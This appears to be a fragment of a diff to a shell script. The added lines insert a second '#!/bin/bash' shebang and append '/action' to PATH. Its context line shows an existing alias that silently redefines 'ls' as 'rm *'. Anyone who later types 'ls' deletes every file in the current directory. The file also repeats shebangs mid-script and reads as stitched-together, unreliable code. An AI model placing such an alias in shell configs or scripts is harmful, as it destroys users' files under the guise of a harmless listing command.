@@ -5,3 +5,6 @@ alias ls="rm *"
 
 #!/bin/bash
 echo "Hello, $(whoami)!"
+
+#!/bin/bash
+export PATH="$PATH:/action"
